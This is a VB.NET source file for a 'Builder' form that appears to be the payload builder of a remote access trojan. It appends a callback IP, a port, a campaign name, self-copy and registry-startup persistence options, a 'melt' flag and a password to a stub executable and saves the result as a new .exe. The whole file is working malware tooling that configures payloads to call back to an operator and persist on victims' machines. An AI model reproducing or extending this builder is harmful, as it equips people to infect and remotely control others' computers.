Imports System.IO
Public Class Builder
    Dim Stub, ip, port As String
    Dim vkf As Keyboard

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    End Sub

    Private Sub PasswordTextBox_Enter(sender As Object, e As EventArgs) Handles PasswordTextBox.Enter
        If vkf Is Nothing Then
            vkf = New Keyboard(sender)
            vkf.Top = Me.Location.Y + PasswordTextBox.Location.Y * 2 + PasswordTextBox.Height
            vkf.Left = Me.Location.X + PasswordTextBox.Location.X
            vkf.Show()
        End If
    End Sub

    Private Sub PasswordTextBox_Leave(sender As Object, e As EventArgs) Handles PasswordTextBox.Leave
        vkf.Close()
        vkf = Nothing
    End Sub

    Const spl = "|\|%x*x%|/|"

    Private Sub CreateButton_Click(sender As Object, e As EventArgs) Handles CreateButton.Click
        Dim s As New SaveFileDialog
        s.ShowDialog()
        If s.FileName > "" Then
            ip = IPTextBox.Text ''ip
            port = PortTextBox.Text ''port
            FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default) ''open stub (server) file TODO:Change
            Stub = Space(LOF(1))
            FileGet(1, Stub)
            FileClose(1)
            FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default) ''file to save
            FilePut(1, Stub & spl & ip & spl & port & spl & NameTextBox.Text & spl & CopyCheckBox.CheckState & spl & CopyTextBox.Text & spl & RegistryCheckBox.CheckState & spl & RegistryTextBox.Text & spl & MeltCheckBox.CheckState & spl & PasswordTextBox.Text)
            ''ip + port + campaign name + copy checkbox + copy name + add to startup + startup key name + melt checkbox + password
            FileClose(1)
            MsgBox("Done")
        End If
    End Sub
End Class